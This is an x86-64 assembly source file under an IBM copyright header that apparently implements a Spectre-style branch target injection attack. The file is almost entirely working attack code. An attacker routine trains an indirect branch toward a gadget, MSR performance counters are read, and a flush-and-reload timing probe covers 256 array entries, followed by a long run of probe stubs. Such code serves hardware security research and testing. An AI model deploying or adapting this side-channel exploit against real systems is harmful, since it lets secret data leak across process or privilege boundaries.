; Copyright 2021 IBM Corporation
;
; Licensed under the Apache License, Version 2.0 (the "License");
; you may not use this file except in compliance with the License.
; You may obtain a copy of the License at
;
;     http://www.apache.org/licenses/LICENSE-2.0
;
; Unless required by applicable law or agreed to in writing, software
; distributed under the License is distributed on an "AS IS" BASIS,
; WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
; See the License for the specific language governing permissions and
; limitations under the License.

[BITS 64]
    %include "common.inc"
    %include "pmc.inc"
    %include "signals.inc"

    %define BASE 0x10000000
    %define TEST_SIZE 0xc

    section .data

    SIGACTION sigaction
    dev_file: db '/dev/cpu/',ATTACKER_PROCESS_STR,'/msr',0
    iteration: dq 1
    is_training: db 1
    fd: dq 0
    val: dq 0
    len: equ $-val
    array: times 2048 db 0
    addr: dq 0
    align 1024
    addr2: dq 0
    align 1024

    fillerteststart: resb (0x1 << 16)

    tester: times 4096* 256 dq 0

    fillertestend: resb (0x1 << 16)

    align 1024
    results: times 256 dd 0
    ;##### DATA STARTS HERE ########

    ;##### DATA ENDS HERE ########

    section .text
    global perf_test_entry:function
    global snippet:function
    global gadget:function
    global secret:function
    global correct:function
    global indirect:function

    extern usleep
    extern set_write_code
    extern print_val

; FIRST BTI CALL TRAINED BY ATTACKER
bti_call:
    call [addr]
    ret

perf_test_entry:
    push rbp
    mov rbp, rsp
    sub rsp, 0

    setup_signal_handler SIGTERM


    call set_write_code

    mov ecx, 256
loop_load_mem:
    push rcx
    mov ax, cx
    sub ax, 1
    shl eax, 16
    add rax, BASE
    mov rbx, rax
    call rax
    clflush [rbx]
    lfence
    pop rcx
    loop loop_load_mem

    mov ecx, 256
clean_array:
    xor rax, rax
    mov rax, 256
    sub eax, ecx
    mov edx, 4096
    mul edx
    add rax, tester
    clflush [rax]
    lfence
    loop clean_array

    check_pinning ATTACKER_PROCESS
    msr_open
    msr_seek

    mov QWORD[addr2], correct
    mov QWORD[iteration], 1
    align 512

attacker:
    ; Train code for BTI
    .train:
        jmpnext256
        jmpnext256
        mov QWORD[addr], gadget
        clflush[addr2]
        lfence

        reset_counter
        start_counter
        .call:
            call bti_call
        stop_counter

        dec QWORD[iteration]
        cmp QWORD[iteration], 0
        jl .exit
        jg .skip ; only at last iteration execute the final call
        mov rax, gadget
        mov BYTE[rax], 0x90
    .skip:
        jmp .train
    .exit:

    xor rcx, rcx
    mov ecx, 256
    .loop_test:
        push rcx ; save loop counter

        mov rax, 256
        sub rax, rcx ; i = 256 - loop_counter

        mov dx, 167
        mul dx
        add eax, 13;17
        and eax, 255
        mov r15d, eax ; mix index to be saved in r15

        xor rax, rax
        mov ax, 4096
        mul r15d
        add rax, tester
        mov r14, rax ; compute cell of array to be access

        rdtscp ; start_time
        mov r12, rdx
        shl r12, 32
        or r12, rax

        ;call r14
        mov r8, [r14] ; array access

        rdtscp ; end_time
        mov r13, rdx
        shl r13, 32
        or r13, rax

        sub r13, r12 ; end_time - start_time

        mov eax, r15d
        mov bx, 4
        mul bx
        add rax, results

        mov DWORD[rax], r13d ; store result

        pop rcx ; restore loop counter
        loop .loop_test

        mov rdi, results
        call print_val

        msr_close
        exit 0

align 1024
gadget:
    ret
    ;SECOND BTI CALL TRAINED BY VICTIM
    call [addr2]
    ret

align 1024
verify:
    mov DWORD[array], eax
    mov DWORD[array+4], edx
    movq xmm0, QWORD[array]
    ret

align 1024
correct:
    ret

align 1024
signal_handler:
    ret

signal_restorer:
    mov rax, SYS_RT_SIGRETURN
    syscall

align 1024
    filler: resb 0xFBFD400
    ret
    align 1024

test0:
    mov rax, QWORD[tester+0*4096]
    ret
    lfence
    filler0: resb (0x1 << 16) - TEST_SIZE

test1:
    mov rax, QWORD[tester+1*4096]
    ret
    lfence
    filler1: resb (0x1 << 16) - TEST_SIZE

test2:
    mov rax, QWORD[tester+2*4096]
    ret
    lfence
    filler2: resb (0x1 << 16) - TEST_SIZE

test3:
    mov rax, QWORD[tester+3*4096]
    ret
    lfence
    filler3: resb (0x1 << 16) - TEST_SIZE

test4:
    mov rax, QWORD[tester+4*4096]
    ret
    lfence
    filler4: resb (0x1 << 16) - TEST_SIZE

test5:
    mov rax, QWORD[tester+5*4096]
    ret
    lfence
    filler5: resb (0x1 << 16) - TEST_SIZE

test6:
    mov rax, QWORD[tester+6*4096]
    ret
    lfence
    filler6: resb (0x1 << 16) - TEST_SIZE

test7:
    mov rax, QWORD[tester+7*4096]
    ret
    lfence
    filler7: resb (0x1 << 16) - TEST_SIZE

test8:
    mov rax, QWORD[tester+8*4096]
    ret
    lfence
    filler8: resb (0x1 << 16) - TEST_SIZE

test9:
    mov rax, QWORD[tester+9*4096]
    ret
    lfence
    filler9: resb (0x1 << 16) - TEST_SIZE

test10:
    mov rax, QWORD[tester+10*4096]
    ret
    lfence
    filler10: resb (0x1 << 16) - TEST_SIZE

test11:
    mov rax, QWORD[tester+11*4096]
    ret
    lfence
    filler11: resb (0x1 << 16) - TEST_SIZE

test12:
    mov rax, QWORD[tester+12*4096]
    ret
    lfence
    filler12: resb (0x1 << 16) - TEST_SIZE

test13:
    mov rax, QWORD[tester+13*4096]
    ret
    lfence
    filler13: resb (0x1 << 16) - TEST_SIZE

test14:
    mov rax, QWORD[tester+14*4096]
    ret
    lfence
    filler14: resb (0x1 << 16) - TEST_SIZE

test15:
    mov rax, QWORD[tester+15*4096]
    ret
    lfence
    filler15: resb (0x1 << 16) - TEST_SIZE

test16:
    mov rax, QWORD[tester+16*4096]
    ret
    lfence
    filler16: resb (0x1 << 16) - TEST_SIZE

test17:
    mov rax, QWORD[tester+17*4096]
    ret
    lfence
    filler17: resb (0x1 << 16) - TEST_SIZE

test18:
    mov rax, QWORD[tester+18*4096]
    ret
    lfence
    filler18: resb (0x1 << 16) - TEST_SIZE

test19:
    mov rax, QWORD[tester+19*4096]
    ret
    lfence
    filler19: resb (0x1 << 16) - TEST_SIZE

test20:
    mov rax, QWORD[tester+20*4096]
    ret
    lfence
    filler20: resb (0x1 << 16) - TEST_SIZE

test21:
    mov rax, QWORD[tester+21*4096]
    ret
    lfence
    filler21: resb (0x1 << 16) - TEST_SIZE

test22:
    mov rax, QWORD[tester+22*4096]
    ret
    lfence
    filler22: resb (0x1 << 16) - TEST_SIZE

test23:
    mov rax, QWORD[tester+23*4096]
    ret
    lfence
    filler23: resb (0x1 << 16) - TEST_SIZE

test24:
    mov rax, QWORD[tester+24*4096]
    ret
    lfence
    filler24: resb (0x1 << 16) - TEST_SIZE

test25:
    mov rax, QWORD[tester+25*4096]
    ret
    lfence
    filler25: resb (0x1 << 16) - TEST_SIZE

test26:
    mov rax, QWORD[tester+26*4096]
    ret
    lfence
    filler26: resb (0x1 << 16) - TEST_SIZE

test27:
    mov rax, QWORD[tester+27*4096]
    ret
    lfence
    filler27: resb (0x1 << 16) - TEST_SIZE

test28:
    mov rax, QWORD[tester+28*4096]
    ret
    lfence
    filler28: resb (0x1 << 16) - TEST_SIZE

test29:
    mov rax, QWORD[tester+29*4096]
    ret
    lfence
    filler29: resb (0x1 << 16) - TEST_SIZE

test30:
    mov rax, QWORD[tester+30*4096]
    ret
    lfence
    filler30: resb (0x1 << 16) - TEST_SIZE

test31:
    mov rax, QWORD[tester+31*4096]
    ret
    lfence
    filler31: resb (0x1 << 16) - TEST_SIZE

test32:
    mov rax, QWORD[tester+32*4096]
    ret
    lfence
    filler32: resb (0x1 << 16) - TEST_SIZE

test33:
    mov rax, QWORD[tester+33*4096]
    ret
    lfence
    filler33: resb (0x1 << 16) - TEST_SIZE

test34:
    mov rax, QWORD[tester+34*4096]
    ret
    lfence
    filler34: resb (0x1 << 16) - TEST_SIZE

test35:
    mov rax, QWORD[tester+35*4096]
    ret
    lfence
    filler35: resb (0x1 << 16) - TEST_SIZE

test36:
    mov rax, QWORD[tester+36*4096]
    ret
    lfence
    filler36: resb (0x1 << 16) - TEST_SIZE

test37:
    mov rax, QWORD[tester+37*4096]
    ret
    lfence
    filler37: resb (0x1 << 16) - TEST_SIZE

test38:
    mov rax, QWORD[tester+38*4096]
    ret
    lfence
    filler38: resb (0x1 << 16) - TEST_SIZE

test39:
    mov rax, QWORD[tester+39*4096]
    ret
    lfence
    filler39: resb (0x1 << 16) - TEST_SIZE

test40:
    mov rax, QWORD[tester+40*4096]
    ret
    lfence
    filler40: resb (0x1 << 16) - TEST_SIZE

test41:
    mov rax, QWORD[tester+41*4096]
    ret
    lfence
    filler41: resb (0x1 << 16) - TEST_SIZE

test42:
    mov rax, QWORD[tester+42*4096]
    ret
    lfence
    filler42: resb (0x1 << 16) - TEST_SIZE

test43:
    mov rax, QWORD[tester+43*4096]
    ret
    lfence
    filler43: resb (0x1 << 16) - TEST_SIZE

test44:
    mov rax, QWORD[tester+44*4096]
    ret
    lfence
    filler44: resb (0x1 << 16) - TEST_SIZE

test45:
    mov rax, QWORD[tester+45*4096]
    ret
    lfence
    filler45: resb (0x1 << 16) - TEST_SIZE

test46:
    mov rax, QWORD[tester+46*4096]
    ret
    lfence
    filler46: resb (0x1 << 16) - TEST_SIZE

test47:
    mov rax, QWORD[tester+47*4096]
    ret
    lfence
    filler47: resb (0x1 << 16) - TEST_SIZE

test48:
    mov rax, QWORD[tester+48*4096]
    ret
    lfence
    filler48: resb (0x1 << 16) - TEST_SIZE

test49:
    mov rax, QWORD[tester+49*4096]
    ret
    lfence
    filler49: resb (0x1 << 16) - TEST_SIZE

test50:
    mov rax, QWORD[tester+50*4096]
    ret
    lfence
    filler50: resb (0x1 << 16) - TEST_SIZE

test51:
    mov rax, QWORD[tester+51*4096]
    ret
    lfence
    filler51: resb (0x1 << 16) - TEST_SIZE

test52:
    mov rax, QWORD[tester+52*4096]
    ret
    lfence
    filler52: resb (0x1 << 16) - TEST_SIZE

test53:
    mov rax, QWORD[tester+53*4096]
    ret
    lfence
    filler53: resb (0x1 << 16) - TEST_SIZE

test54:
    mov rax, QWORD[tester+54*4096]
    ret
    lfence
    filler54: resb (0x1 << 16) - TEST_SIZE

test55:
    mov rax, QWORD[tester+55*4096]
    ret
    lfence
    filler55: resb (0x1 << 16) - TEST_SIZE

test56:
    mov rax, QWORD[tester+56*4096]
    ret
    lfence
    filler56: resb (0x1 << 16) - TEST_SIZE

test57:
    mov rax, QWORD[tester+57*4096]
    ret
    lfence
    filler57: resb (0x1 << 16) - TEST_SIZE

test58:
    mov rax, QWORD[tester+58*4096]
    ret
    lfence
    filler58: resb (0x1 << 16) - TEST_SIZE

test59:
    mov rax, QWORD[tester+59*4096]
    ret
    lfence
    filler59: resb (0x1 << 16) - TEST_SIZE

test60:
    mov rax, QWORD[tester+60*4096]
    ret
    lfence
    filler60: resb (0x1 << 16) - TEST_SIZE

test61:
    mov rax, QWORD[tester+61*4096]
    ret
    lfence
    filler61: resb (0x1 << 16) - TEST_SIZE

test62:
    mov rax, QWORD[tester+62*4096]
    ret
    lfence
    filler62: resb (0x1 << 16) - TEST_SIZE

test63:
    mov rax, QWORD[tester+63*4096]
    ret
    lfence
    filler63: resb (0x1 << 16) - TEST_SIZE

test64:
    mov rax, QWORD[tester+64*4096]
    ret
    lfence
    filler64: resb (0x1 << 16) - TEST_SIZE

test65:
    mov rax, QWORD[tester+65*4096]
    ret
    lfence
    filler65: resb (0x1 << 16) - TEST_SIZE

test66:
    mov rax, QWORD[tester+66*4096]
    ret
    lfence
    filler66: resb (0x1 << 16) - TEST_SIZE

test67:
    mov rax, QWORD[tester+67*4096]
    ret
    lfence
    filler67: resb (0x1 << 16) - TEST_SIZE

test68:
    mov rax, QWORD[tester+68*4096]
    ret
    lfence
    filler68: resb (0x1 << 16) - TEST_SIZE

test69:
    mov rax, QWORD[tester+69*4096]
    ret
    lfence
    filler69: resb (0x1 << 16) - TEST_SIZE

test70:
    mov rax, QWORD[tester+70*4096]
    ret
    lfence
    filler70: resb (0x1 << 16) - TEST_SIZE

test71:
    mov rax, QWORD[tester+71*4096]
    ret
    lfence
    filler71: resb (0x1 << 16) - TEST_SIZE

test72:
    mov rax, QWORD[tester+72*4096]
    ret
    lfence
    filler72: resb (0x1 << 16) - TEST_SIZE

test73:
    mov rax, QWORD[tester+73*4096]
    ret
    lfence
    filler73: resb (0x1 << 16) - TEST_SIZE

test74:
    mov rax, QWORD[tester+74*4096]
    ret
    lfence
    filler74: resb (0x1 << 16) - TEST_SIZE

test75:
    mov rax, QWORD[tester+75*4096]
    ret
    lfence
    filler75: resb (0x1 << 16) - TEST_SIZE

test76:
    mov rax, QWORD[tester+76*4096]
    ret
    lfence
    filler76: resb (0x1 << 16) - TEST_SIZE

test77:
    mov rax, QWORD[tester+77*4096]
    ret
    lfence
    filler77: resb (0x1 << 16) - TEST_SIZE

test78:
    mov rax, QWORD[tester+78*4096]
    ret
    lfence
    filler78: resb (0x1 << 16) - TEST_SIZE

test79:
    mov rax, QWORD[tester+79*4096]
    ret
    lfence
    filler79: resb (0x1 << 16) - TEST_SIZE

test80:
    mov rax, QWORD[tester+80*4096]
    ret
    lfence
    filler80: resb (0x1 << 16) - TEST_SIZE

test81:
    mov rax, QWORD[tester+81*4096]
    ret
    lfence
    filler81: resb (0x1 << 16) - TEST_SIZE

test82:
    mov rax, QWORD[tester+82*4096]
    ret
    lfence
    filler82: resb (0x1 << 16) - TEST_SIZE

test83:
    mov rax, QWORD[tester+83*4096]
    ret
    lfence
    filler83: resb (0x1 << 16) - TEST_SIZE

test84:
    mov rax, QWORD[tester+84*4096]
    ret
    lfence
    filler84: resb (0x1 << 16) - TEST_SIZE

test85:
    mov rax, QWORD[tester+85*4096]
    ret
    lfence
    filler85: resb (0x1 << 16) - TEST_SIZE

test86:
    mov rax, QWORD[tester+86*4096]
    ret
    lfence
    filler86: resb (0x1 << 16) - TEST_SIZE

test87:
    mov rax, QWORD[tester+87*4096]
    ret
    lfence
    filler87: resb (0x1 << 16) - TEST_SIZE

test88:
    mov rax, QWORD[tester+88*4096]
    ret
    lfence
    filler88: resb (0x1 << 16) - TEST_SIZE

test89:
    mov rax, QWORD[tester+89*4096]
    ret
    lfence
    filler89: resb (0x1 << 16) - TEST_SIZE

test90:
    mov rax, QWORD[tester+90*4096]
    ret
    lfence
    filler90: resb (0x1 << 16) - TEST_SIZE

test91:
    mov rax, QWORD[tester+91*4096]
    ret
    lfence
    filler91: resb (0x1 << 16) - TEST_SIZE

test92:
    mov rax, QWORD[tester+92*4096]
    ret
    lfence
    filler92: resb (0x1 << 16) - TEST_SIZE

test93:
    mov rax, QWORD[tester+93*4096]
    ret
    lfence
    filler93: resb (0x1 << 16) - TEST_SIZE

test94:
    mov rax, QWORD[tester+94*4096]
    ret
    lfence
    filler94: resb (0x1 << 16) - TEST_SIZE

test95:
    mov rax, QWORD[tester+95*4096]
    ret
    lfence
    filler95: resb (0x1 << 16) - TEST_SIZE

test96:
    mov rax, QWORD[tester+96*4096]
    ret
    lfence
    filler96: resb (0x1 << 16) - TEST_SIZE

test97:
    mov rax, QWORD[tester+97*4096]
    ret
    lfence
    filler97: resb (0x1 << 16) - TEST_SIZE

test98:
    mov rax, QWORD[tester+98*4096]
    ret
    lfence
    filler98: resb (0x1 << 16) - TEST_SIZE

test99:
    mov rax, QWORD[tester+99*4096]
    ret
    lfence
    filler99: resb (0x1 << 16) - TEST_SIZE

test100:
    mov rax, QWORD[tester+100*4096]
    ret
    lfence
    filler100: resb (0x1 << 16) - TEST_SIZE

test101:
    mov rax, QWORD[tester+101*4096]
    ret
    lfence
    filler101: resb (0x1 << 16) - TEST_SIZE

test102:
    mov rax, QWORD[tester+102*4096]
    ret
    lfence
    filler102: resb (0x1 << 16) - TEST_SIZE

test103:
    mov rax, QWORD[tester+103*4096]
    ret
    lfence
    filler103: resb (0x1 << 16) - TEST_SIZE

test104:
    mov rax, QWORD[tester+104*4096]
    ret
    lfence
    filler104: resb (0x1 << 16) - TEST_SIZE

test105:
    mov rax, QWORD[tester+105*4096]
    ret
    lfence
    filler105: resb (0x1 << 16) - TEST_SIZE

test106:
    mov rax, QWORD[tester+106*4096]
    ret
    lfence
    filler106: resb (0x1 << 16) - TEST_SIZE

test107:
    mov rax, QWORD[tester+107*4096]
    ret
    lfence
    filler107: resb (0x1 << 16) - TEST_SIZE

test108:
    mov rax, QWORD[tester+108*4096]
    ret
    lfence
    filler108: resb (0x1 << 16) - TEST_SIZE

test109:
    mov rax, QWORD[tester+109*4096]
    ret
    lfence
    filler109: resb (0x1 << 16) - TEST_SIZE

test110:
    mov rax, QWORD[tester+110*4096]
    ret
    lfence
    filler110: resb (0x1 << 16) - TEST_SIZE

test111:
    mov rax, QWORD[tester+111*4096]
    ret
    lfence
    filler111: resb (0x1 << 16) - TEST_SIZE

test112:
    mov rax, QWORD[tester+112*4096]
    ret
    lfence
    filler112: resb (0x1 << 16) - TEST_SIZE

test113:
    mov rax, QWORD[tester+113*4096]
    ret
    lfence
    filler113: resb (0x1 << 16) - TEST_SIZE

test114:
    mov rax, QWORD[tester+114*4096]
    ret
    lfence
    filler114: resb (0x1 << 16) - TEST_SIZE

test115:
    mov rax, QWORD[tester+115*4096]
    ret
    lfence
    filler115: resb (0x1 << 16) - TEST_SIZE

test116:
    mov rax, QWORD[tester+116*4096]
    ret
    lfence
    filler116: resb (0x1 << 16) - TEST_SIZE

test117:
    mov rax, QWORD[tester+117*4096]
    ret
    lfence
    filler117: resb (0x1 << 16) - TEST_SIZE

test118:
    mov rax, QWORD[tester+118*4096]
    ret
    lfence
    filler118: resb (0x1 << 16) - TEST_SIZE

test119:
    mov rax, QWORD[tester+119*4096]
    ret
    lfence
    filler119: resb (0x1 << 16) - TEST_SIZE

test120:
    mov rax, QWORD[tester+120*4096]
    ret
    lfence
    filler120: resb (0x1 << 16) - TEST_SIZE

test121:
    mov rax, QWORD[tester+121*4096]
    ret
    lfence
    filler121: resb (0x1 << 16) - TEST_SIZE

test122:
    mov rax, QWORD[tester+122*4096]
    ret
    lfence
    filler122: resb (0x1 << 16) - TEST_SIZE

test123:
    mov rax, QWORD[tester+123*4096]
    ret
    lfence
    filler123: resb (0x1 << 16) - TEST_SIZE

test124:
    mov rax, QWORD[tester+124*4096]
    ret
    lfence
    filler124: resb (0x1 << 16) - TEST_SIZE

test125:
    mov rax, QWORD[tester+125*4096]
    ret
    lfence
    filler125: resb (0x1 << 16) - TEST_SIZE

test126:
    mov rax, QWORD[tester+126*4096]
    ret
    lfence
    filler126: resb (0x1 << 16) - TEST_SIZE

test127:
    mov rax, QWORD[tester+127*4096]
    ret
    lfence
    filler127: resb (0x1 << 16) - TEST_SIZE

test128:
    mov rax, QWORD[tester+128*4096]
    ret
    lfence
    filler128: resb (0x1 << 16) - TEST_SIZE

test129:
    mov rax, QWORD[tester+129*4096]
    ret
    lfence
    filler129: resb (0x1 << 16) - TEST_SIZE

test130:
    mov rax, QWORD[tester+130*4096]
    ret
    lfence
    filler130: resb (0x1 << 16) - TEST_SIZE

test131:
    mov rax, QWORD[tester+131*4096]
    ret
    lfence
    filler131: resb (0x1 << 16) - TEST_SIZE

test132:
    mov rax, QWORD[tester+132*4096]
    ret
    lfence
    filler132: resb (0x1 << 16) - TEST_SIZE

test133:
    mov rax, QWORD[tester+133*4096]
    ret
    lfence
    filler133: resb (0x1 << 16) - TEST_SIZE

test134:
    mov rax, QWORD[tester+134*4096]
    ret
    lfence
    filler134: resb (0x1 << 16) - TEST_SIZE

test135:
    mov rax, QWORD[tester+135*4096]
    ret
    lfence
    filler135: resb (0x1 << 16) - TEST_SIZE

test136:
    mov rax, QWORD[tester+136*4096]
    ret
    lfence
    filler136: resb (0x1 << 16) - TEST_SIZE

test137:
    mov rax, QWORD[tester+137*4096]
    ret
    lfence
    filler137: resb (0x1 << 16) - TEST_SIZE

test138:
    mov rax, QWORD[tester+138*4096]
    ret
    lfence
    filler138: resb (0x1 << 16) - TEST_SIZE

test139:
    mov rax, QWORD[tester+139*4096]
    ret
    lfence
    filler139: resb (0x1 << 16) - TEST_SIZE

test140:
    mov rax, QWORD[tester+140*4096]
    ret
    lfence
    filler140: resb (0x1 << 16) - TEST_SIZE

test141:
    mov rax, QWORD[tester+141*4096]
    ret
    lfence
    filler141: resb (0x1 << 16) - TEST_SIZE

test142:
    mov rax, QWORD[tester+142*4096]
    ret
    lfence
    filler142: resb (0x1 << 16) - TEST_SIZE

test143:
    mov rax, QWORD[tester+143*4096]
    ret
    lfence
    filler143: resb (0x1 << 16) - TEST_SIZE

test144:
    mov rax, QWORD[tester+144*4096]
    ret
    lfence
    filler144: resb (0x1 << 16) - TEST_SIZE

test145:
    mov rax, QWORD[tester+145*4096]
    ret
    lfence
    filler145: resb (0x1 << 16) - TEST_SIZE

test146:
    mov rax, QWORD[tester+146*4096]
    ret
    lfence
    filler146: resb (0x1 << 16) - TEST_SIZE

test147:
    mov rax, QWORD[tester+147*4096]
    ret
    lfence
    filler147: resb (0x1 << 16) - TEST_SIZE

test148:
    mov rax, QWORD[tester+148*4096]
    ret
    lfence
    filler148: resb (0x1 << 16) - TEST_SIZE

test149:
    mov rax, QWORD[tester+149*4096]
    ret
    lfence
    filler149: resb (0x1 << 16) - TEST_SIZE

test150:
    mov rax, QWORD[tester+150*4096]
    ret
    lfence
    filler150: resb (0x1 << 16) - TEST_SIZE

test151:
    mov rax, QWORD[tester+151*4096]
    ret
    lfence
    filler151: resb (0x1 << 16) - TEST_SIZE

test152:
    mov rax, QWORD[tester+152*4096]
    ret
    lfence
    filler152: resb (0x1 << 16) - TEST_SIZE

test153:
    mov rax, QWORD[tester+153*4096]
    ret
    lfence
    filler153: resb (0x1 << 16) - TEST_SIZE

test154:
    mov rax, QWORD[tester+154*4096]
    ret
    lfence
    filler154: resb (0x1 << 16) - TEST_SIZE

test155:
    mov rax, QWORD[tester+155*4096]
    ret
    lfence
    filler155: resb (0x1 << 16) - TEST_SIZE

test156:
    mov rax, QWORD[tester+156*4096]
    ret
    lfence
    filler156: resb (0x1 << 16) - TEST_SIZE

test157:
    mov rax, QWORD[tester+157*4096]
    ret
    lfence
    filler157: resb (0x1 << 16) - TEST_SIZE

test158:
    mov rax, QWORD[tester+158*4096]
    ret
    lfence
    filler158: resb (0x1 << 16) - TEST_SIZE

test159:
    mov rax, QWORD[tester+159*4096]
    ret
    lfence
    filler159: resb (0x1 << 16) - TEST_SIZE

test160:
    mov rax, QWORD[tester+160*4096]
    ret
    lfence
    filler160: resb (0x1 << 16) - TEST_SIZE

test161:
    mov rax, QWORD[tester+161*4096]
    ret
    lfence
    filler161: resb (0x1 << 16) - TEST_SIZE

test162:
    mov rax, QWORD[tester+162*4096]
    ret
    lfence
    filler162: resb (0x1 << 16) - TEST_SIZE

test163:
    mov rax, QWORD[tester+163*4096]
    ret
    lfence
    filler163: resb (0x1 << 16) - TEST_SIZE

test164:
    mov rax, QWORD[tester+164*4096]
    ret
    lfence
    filler164: resb (0x1 << 16) - TEST_SIZE

test165:
    mov rax, QWORD[tester+165*4096]
    ret
    lfence
    filler165: resb (0x1 << 16) - TEST_SIZE

test166:
    mov rax, QWORD[tester+166*4096]
    ret
    lfence
    filler166: resb (0x1 << 16) - TEST_SIZE

test167:
    mov rax, QWORD[tester+167*4096]
    ret
    lfence
    filler167: resb (0x1 << 16) - TEST_SIZE

test168:
    mov rax, QWORD[tester+168*4096]
    ret
    lfence
    filler168: resb (0x1 << 16) - TEST_SIZE

test169:
    mov rax, QWORD[tester+169*4096]
    ret
    lfence
    filler169: resb (0x1 << 16) - TEST_SIZE

test170:
    mov rax, QWORD[tester+170*4096]
    ret
    lfence
    filler170: resb (0x1 << 16) - TEST_SIZE

test171:
    mov rax, QWORD[tester+171*4096]
    ret
    lfence
    filler171: resb (0x1 << 16) - TEST_SIZE

test172:
    mov rax, QWORD[tester+172*4096]
    ret
    lfence
    filler172: resb (0x1 << 16) - TEST_SIZE

test173:
    mov rax, QWORD[tester+173*4096]
    ret
    lfence
    filler173: resb (0x1 << 16) - TEST_SIZE

test174:
    mov rax, QWORD[tester+174*4096]
    ret
    lfence
    filler174: resb (0x1 << 16) - TEST_SIZE

test175:
    mov rax, QWORD[tester+175*4096]
    ret
    lfence
    filler175: resb (0x1 << 16) - TEST_SIZE

test176:
    mov rax, QWORD[tester+176*4096]
    ret
    lfence
    filler176: resb (0x1 << 16) - TEST_SIZE

test177:
    mov rax, QWORD[tester+177*4096]
    ret
    lfence
    filler177: resb (0x1 << 16) - TEST_SIZE

test178:
    mov rax, QWORD[tester+178*4096]
    ret
    lfence
    filler178: resb (0x1 << 16) - TEST_SIZE

test179:
    mov rax, QWORD[tester+179*4096]
    ret
    lfence
    filler179: resb (0x1 << 16) - TEST_SIZE

test180:
    mov rax, QWORD[tester+180*4096]
    ret
    lfence
    filler180: resb (0x1 << 16) - TEST_SIZE

test181:
    mov rax, QWORD[tester+181*4096]
    ret
    lfence
    filler181: resb (0x1 << 16) - TEST_SIZE

test182:
    mov rax, QWORD[tester+182*4096]
    ret
    lfence
    filler182: resb (0x1 << 16) - TEST_SIZE

test183:
    mov rax, QWORD[tester+183*4096]
    ret
    lfence
    filler183: resb (0x1 << 16) - TEST_SIZE

test184:
    mov rax, QWORD[tester+184*4096]
    ret
    lfence
    filler184: resb (0x1 << 16) - TEST_SIZE

test185:
    mov rax, QWORD[tester+185*4096]
    ret
    lfence
    filler185: resb (0x1 << 16) - TEST_SIZE

test186:
    mov rax, QWORD[tester+186*4096]
    ret
    lfence
    filler186: resb (0x1 << 16) - TEST_SIZE

test187:
    mov rax, QWORD[tester+187*4096]
    ret
    lfence
    filler187: resb (0x1 << 16) - TEST_SIZE

test188:
    mov rax, QWORD[tester+188*4096]
    ret
    lfence
    filler188: resb (0x1 << 16) - TEST_SIZE

test189:
    mov rax, QWORD[tester+189*4096]
    ret
    lfence
    filler189: resb (0x1 << 16) - TEST_SIZE

test190:
    mov rax, QWORD[tester+190*4096]
    ret
    lfence
    filler190: resb (0x1 << 16) - TEST_SIZE

test191:
    mov rax, QWORD[tester+191*4096]
    ret
    lfence
    filler191: resb (0x1 << 16) - TEST_SIZE

test192:
    mov rax, QWORD[tester+192*4096]
    ret
    lfence
    filler192: resb (0x1 << 16) - TEST_SIZE

test193:
    mov rax, QWORD[tester+193*4096]
    ret
    lfence
    filler193: resb (0x1 << 16) - TEST_SIZE

test194:
    mov rax, QWORD[tester+194*4096]
    ret
    lfence
    filler194: resb (0x1 << 16) - TEST_SIZE

test195:
    mov rax, QWORD[tester+195*4096]
    ret
    lfence
    filler195: resb (0x1 << 16) - TEST_SIZE

test196:
    mov rax, QWORD[tester+196*4096]
    ret
    lfence
    filler196: resb (0x1 << 16) - TEST_SIZE

test197:
    mov rax, QWORD[tester+197*4096]
    ret
    lfence
    filler197: resb (0x1 << 16) - TEST_SIZE

test198:
    mov rax, QWORD[tester+198*4096]
    ret
    lfence
    filler198: resb (0x1 << 16) - TEST_SIZE

test199:
    mov rax, QWORD[tester+199*4096]
    ret
    lfence
    filler199: resb (0x1 << 16) - TEST_SIZE

test200:
    mov rax, QWORD[tester+200*4096]
    ret
    lfence
    filler200: resb (0x1 << 16) - TEST_SIZE

test201:
    mov rax, QWORD[tester+201*4096]
    ret
    lfence
    filler201: resb (0x1 << 16) - TEST_SIZE

test202:
    mov rax, QWORD[tester+202*4096]
    ret
    lfence
    filler202: resb (0x1 << 16) - TEST_SIZE

test203:
    mov rax, QWORD[tester+203*4096]
    ret
    lfence
    filler203: resb (0x1 << 16) - TEST_SIZE

test204:
    mov rax, QWORD[tester+204*4096]
    ret
    lfence
    filler204: resb (0x1 << 16) - TEST_SIZE

test205:
    mov rax, QWORD[tester+205*4096]
    ret
    lfence
    filler205: resb (0x1 << 16) - TEST_SIZE

test206:
    mov rax, QWORD[tester+206*4096]
    ret
    lfence
    filler206: resb (0x1 << 16) - TEST_SIZE

test207:
    mov rax, QWORD[tester+207*4096]
    ret
    lfence
    filler207: resb (0x1 << 16) - TEST_SIZE

test208:
    mov rax, QWORD[tester+208*4096]
    ret
    lfence
    filler208: resb (0x1 << 16) - TEST_SIZE

test209:
    mov rax, QWORD[tester+209*4096]
    ret
    lfence
    filler209: resb (0x1 << 16) - TEST_SIZE

test210:
    mov rax, QWORD[tester+210*4096]
    ret
    lfence
    filler210: resb (0x1 << 16) - TEST_SIZE

test211:
    mov rax, QWORD[tester+211*4096]
    ret
    lfence
    filler211: resb (0x1 << 16) - TEST_SIZE

test212:
    mov rax, QWORD[tester+212*4096]
    ret
    lfence
    filler212: resb (0x1 << 16) - TEST_SIZE

test213:
    mov rax, QWORD[tester+213*4096]
    ret
    lfence
    filler213: resb (0x1 << 16) - TEST_SIZE

test214:
    mov rax, QWORD[tester+214*4096]
    ret
    lfence
    filler214: resb (0x1 << 16) - TEST_SIZE

test215:
    mov rax, QWORD[tester+215*4096]
    ret
    lfence
    filler215: resb (0x1 << 16) - TEST_SIZE

test216:
    mov rax, QWORD[tester+216*4096]
    ret
    lfence
    filler216: resb (0x1 << 16) - TEST_SIZE

test217:
    mov rax, QWORD[tester+217*4096]
    ret
    lfence
    filler217: resb (0x1 << 16) - TEST_SIZE

test218:
    mov rax, QWORD[tester+218*4096]
    ret
    lfence
    filler218: resb (0x1 << 16) - TEST_SIZE

test219:
    mov rax, QWORD[tester+219*4096]
    ret
    lfence
    filler219: resb (0x1 << 16) - TEST_SIZE

test220:
    mov rax, QWORD[tester+220*4096]
    ret
    lfence
    filler220: resb (0x1 << 16) - TEST_SIZE

test221:
    mov rax, QWORD[tester+221*4096]
    ret
    lfence
    filler221: resb (0x1 << 16) - TEST_SIZE

test222:
    mov rax, QWORD[tester+222*4096]
    ret
    lfence
    filler222: resb (0x1 << 16) - TEST_SIZE

test223:
    mov rax, QWORD[tester+223*4096]
    ret
    lfence
